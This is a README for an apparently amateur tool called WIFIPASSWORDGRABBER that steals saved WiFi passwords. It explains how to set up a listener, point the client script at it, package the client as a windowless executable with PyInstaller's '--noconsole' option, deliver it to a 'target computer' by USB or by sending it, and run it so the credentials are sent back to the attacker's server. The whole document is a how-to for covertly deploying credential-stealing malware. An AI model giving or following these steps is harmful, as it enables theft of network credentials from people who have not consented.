Welcome to my program, this is a guide on how to use it.

REQUIREMENTS
- Server computer must have Python installed to one of the recent versions

- Server computer must have this python module for packaging of client code to run as
executable: PyInstaller

- Must have access to the intended target computer and the computer you intend to run the server on

- Both client and server side must be run on Windows

- They must both be run while connected to a wifi network

- If the client side is being ran on a properly encrypted network,
please try to connect the server side to the same wifi for the best results


INSTRUCTIONS

1. To start, run the server script on the intended server computer, and take the string
of numbers at the end of the listener established output and place it in the WIFIPASSWORDGRABBER.py 
file, in the section where it says too. There is a comment telling you where it is.

2. Next is the packaging of WIFIPASSWORDGRABBER. Open up your files, find where WIFIPASSWORDGRABBER is
and copy its file path. Then open up command prompt and type in something like this:
python -m PyInstaller --onefile --noconsole YOURFILEPATHHERE

3. Find where PyInstaller has packaged it too, and then that is your executable. Upload it to the target
computer through sending it to them or something like a USB drive it up to you, and then run it on the client

4. It should send through the information to the server computer and then that is it, the program is complete.